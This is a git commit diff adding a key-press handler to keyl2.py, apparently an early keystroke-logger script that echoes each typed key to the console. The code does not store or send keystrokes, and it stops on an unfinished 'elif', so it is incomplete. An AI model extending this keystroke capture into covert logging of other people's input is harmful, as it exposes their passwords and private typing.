d30126918837b5980e0e95175c21fac3091c4084
Collins Karweru <Collinskarweru@gmail.com>
2026-08-06 22:57:27 +0300

    commit

--- keyl2.py
+++ keyl2.py
@@ -3,4 +3,14 @@ import sys
 
 def on_press (key):
     try:
-        
+        sys.stdout.write(key.char)
+        sys.stdout.flush()
+
+    except AttributeError:
+        if key == keyboard.Key.enter:
+            sys.stdout.write("\n")
+        elif key == keyboard.Key.tab:
+            sys.stdout.write("\t")
+        elif key == keyboard.Key.space:
+            sys.stdout.write(" ")
+        elif
